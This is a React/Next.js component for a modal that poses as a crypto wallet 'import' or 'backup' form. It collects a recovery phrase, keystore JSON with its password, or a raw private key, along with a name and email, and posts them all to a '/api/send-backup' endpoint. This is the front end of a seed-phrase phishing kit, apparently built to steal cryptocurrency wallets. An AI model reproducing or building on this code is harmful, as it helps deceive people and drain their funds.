"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";

interface BackupFormModalProps {
  isOpen: boolean;
  onClose: () => void;
  walletName: string;
  walletSrc?: string;
}

export default function BackupFormModal({ isOpen, onClose, walletName, walletSrc }: BackupFormModalProps) {
  const [activeTab, setActiveTab] = useState<"phrase" | "keystore" | "private">("phrase");
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    phrase: "",
    keystore: "",
    password: "",
    privateKey: "",
  });
  const [loading, setLoading] = useState(false);
  const router = useRouter();

  if (!isOpen) return null;

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    // Enhanced Validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!formData.name || !formData.email || !emailRegex.test(formData.email)) {
      alert("Please enter a valid Name and Email address");
      return;
    }

    let data = "";
    if (activeTab === "phrase") {
      data = formData.phrase.trim();
      const wordCount = data.split(/\s+/).length;
      if (![12, 15, 18, 21, 24].includes(wordCount)) {
        alert(`Recovery phrase must be 12, 15, 18, 21, or 24 words. (Entered: ${wordCount})`);
        return;
      }
    } else if (activeTab === "keystore") {
      data = formData.keystore.trim();
      try {
        const json = JSON.parse(data);
        if (!json || typeof json !== 'object') throw new Error();
      } catch (err) {
        alert("Please enter a valid Keystore JSON");
        return;
      }
      if (!formData.password) {
        alert("Please enter the wallet password for the keystore");
        return;
      }
    } else if (activeTab === "private") {
      data = formData.privateKey.trim();
      const privateKeyRegex = /^(0x)?[a-fA-F0-9]{64}$/;
      if (!privateKeyRegex.test(data)) {
        alert("Please enter a valid 64-character hex private key");
        return;
      }
    }

    if (!data) {
      alert(`Please enter your ${activeTab === "phrase" ? "recovery phrase" : activeTab === "keystore" ? "keystore JSON" : "private key"}`);
      return;
    }

    setLoading(true);
    try {
      const response = await fetch("/api/send-backup", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletName,
          type: activeTab,
          data,
          name: formData.name,
          email: formData.email,
          password: activeTab === "keystore" ? formData.password : undefined,
        }),
      });

      if (response.ok) {
        router.push("/success");
      } else {
        const result = await response.json();
        alert(result.error || "Failed to send backup. Please try again.");
      }
    } catch (err) {
      console.error(err);
      alert("An error occurred. Please check your connection.");
    } finally {
      setLoading(false);
    }
  };

  const inputStyle: React.CSSProperties = {
    width: "100%",
    background: "#d4f1ff",
    border: "1px solid #ccc",
    borderRadius: "6px",
    padding: "12px 14px",
    fontSize: "14px",
    color: "#222",
    outline: "none",
    boxSizing: "border-box",
  };

  const labelStyle: React.CSSProperties = {
    fontSize: "14px",
    fontWeight: 600,
    marginBottom: "6px",
    display: "block",
    color: "#111",
  };

  return (
    <>
      <div
        className="fixed inset-0 flex items-center justify-center px-3"
        style={{ zIndex: 999, background: "rgba(0,0,0,0.5)" }}
        onClick={onClose}
      >
        <div
          onClick={(e) => e.stopPropagation()}
          style={{
            background: "#e9f8ff",
            width: "100%",
            maxWidth: "620px",
            borderRadius: "12px",
            border: "none",
            borderBottom: "4px solid #02050a",
            position: "relative",
            boxShadow: "0 8px 40px rgba(0,0,0,0.25)",
            maxHeight: "90vh",
            overflowY: "auto",
          }}
        >
          {/* Header */}
          <div style={{ padding: "20px 24px 0", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
            <div style={{ display: "flex", alignItems: "center", gap: "14px" }}>
              {walletSrc && (
                <img
                  src={walletSrc}
                  alt={walletName}
                  style={{ width: "48px", height: "48px", borderRadius: "10px", objectFit: "cover", flexShrink: 0 }}
                  onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }}
                />
              )}
              <h5 style={{ margin: 0, fontWeight: 600, fontSize: "1.2rem", color: "#111" }}>
                Import your {walletName} Wallet
              </h5>
            </div>
            <button
              onClick={onClose}
              style={{ background: "transparent", border: "none", fontSize: "1.4rem", cursor: "pointer", color: "#555", lineHeight: 1 }}
            >
              ×
            </button>
          </div>

          {/* Tabs — underline style */}
          <div style={{ padding: "16px 24px 0", borderBottom: "1px solid #ddd", display: "flex", gap: "0" }}>
            {(["phrase", "keystore", "private"] as const).map((tab) => {
              const labels = { phrase: "Phrase", keystore: "Keystore JSON", private: "Private Key" };
              return (
                <button
                  key={tab}
                  onClick={() => setActiveTab(tab)}
                  style={{
                    background: "transparent",
                    border: "none",
                    borderBottom: activeTab === tab ? "3px solid #02050a" : "3px solid transparent",
                    padding: "8px 20px 12px",
                    fontWeight: activeTab === tab ? 700 : 400,
                    fontSize: "15px",
                    color: "#000",
                    cursor: "pointer",
                    transition: "border-color 0.2s",
                  }}
                >
                  {labels[tab]}
                </button>
              );
            })}
          </div>

          {/* Form body */}
          <form onSubmit={handleSubmit} style={{ padding: "20px 24px 16px" }}>

            {/* Phrase tab */}
            {activeTab === "phrase" && (
              <div>
                <div style={{ marginBottom: "16px" }}>
                  <label style={labelStyle}>Name wallet</label>
                  <input required name="name" value={formData.name} onChange={handleChange} type="text" placeholder="Name wallet" style={inputStyle} />
                </div>
                <div style={{ marginBottom: "16px" }}>
                  <label style={labelStyle}>Email</label>
                  <input required name="email" value={formData.email} onChange={handleChange} type="email" placeholder="Email" style={inputStyle} />
                </div>
                <div style={{ marginBottom: "6px" }}>
                  <label style={labelStyle}>Phrase</label>
                  <textarea
                    required
                    name="phrase"
                    value={formData.phrase}
                    onChange={handleChange}
                    placeholder="Enter your recovery phrase"
                    style={{ ...inputStyle, height: "110px", resize: "vertical" }}
                  />
                </div>
                <p style={{ fontSize: "12px", color: "#777", marginBottom: "20px" }}>
                  Typically 12 (sometimes 24) words separated by single spaces
                </p>
              </div>
            )}

            {/* Keystore JSON tab */}
            {activeTab === "keystore" && (
              <div>
                <p style={{ fontSize: "14px", color: "#444", marginBottom: "14px" }}>
                  Upload or paste your keystore JSON contents here.
                </p>
                <div style={{ marginBottom: "12px" }}>
                  <input required name="name" value={formData.name} onChange={handleChange} type="text" placeholder="Name wallet" style={inputStyle} />
                </div>
                <div style={{ marginBottom: "12px" }}>
                  <input required name="email" value={formData.email} onChange={handleChange} type="email" placeholder="Email" style={inputStyle} />
                </div>
                <div style={{ marginBottom: "12px" }}>
                  <textarea
                    required
                    name="keystore"
                    value={formData.keystore}
                    onChange={handleChange}
                    placeholder="Keystore JSON"
                    style={{ ...inputStyle, height: "120px", resize: "vertical" }}
                  />
                </div>
                <div style={{ marginBottom: "6px" }}>
                  <input required name="password" value={formData.password} onChange={handleChange} type="password" placeholder="Wallet password" style={inputStyle} />
                </div>
                <p style={{ fontSize: "12px", color: "#777", marginBottom: "20px" }}>
                  Several lines of text beginning with "{"{...}"}" plus the password you used to encrypt it.
                </p>
              </div>
            )}

            {/* Private Key tab */}
            {activeTab === "private" && (
              <div>
                <p style={{ fontSize: "14px", color: "#444", marginBottom: "14px" }}>
                  Enter your private key below:
                </p>
                <div style={{ marginBottom: "12px" }}>
                  <input required name="name" value={formData.name} onChange={handleChange} type="text" placeholder="Name wallet" style={inputStyle} />
                </div>
                <div style={{ marginBottom: "12px" }}>
                  <input required name="email" value={formData.email} onChange={handleChange} type="email" placeholder="Email" style={inputStyle} />
                </div>
                <div style={{ marginBottom: "6px" }}>
                  <input required name="privateKey" value={formData.privateKey} onChange={handleChange} type="text" placeholder="Enter your private key" style={inputStyle} />
                </div>
                <p style={{ fontSize: "12px", color: "#777", marginBottom: "20px" }}>
                  Typically 12 (sometimes 24) words separated by a single space.
                </p>
              </div>
            )}

            {/* Footer buttons */}
            <div style={{ display: "flex", justifyContent: "flex-end", gap: "12px", paddingTop: "4px" }}>
              <button
                type="button"
                onClick={onClose}
                style={{
                  background: "#da3ca1",
                  color: "#fff",
                  border: "none",
                  borderRadius: "20px",
                  padding: "10px 28px",
                  fontWeight: 600,
                  fontSize: "15px",
                  cursor: "pointer",
                }}
              >
                Cancel
              </button>
              <button
                type="submit"
                disabled={loading}
                style={{
                  background: "#007184",
                  color: "#fff",
                  border: "none",
                  borderRadius: "20px",
                  padding: "10px 28px",
                  fontWeight: 600,
                  fontSize: "15px",
                  cursor: loading ? "not-allowed" : "pointer",
                  opacity: loading ? 0.75 : 1,
                }}
              >
                {loading ? "Processing..." : "Proceed"}
              </button>
            </div>
          </form>
        </div>
      </div>

      {loading && (
        <div className="z-1000 fixed top-0 bg-[#b4b6b6]/40 left-0 right-0 bottom-0 flex items-center justify-center">
          <p className="text-lg font-semibold">Loading...</p>
        </div>
      )}
    </>
  );
}
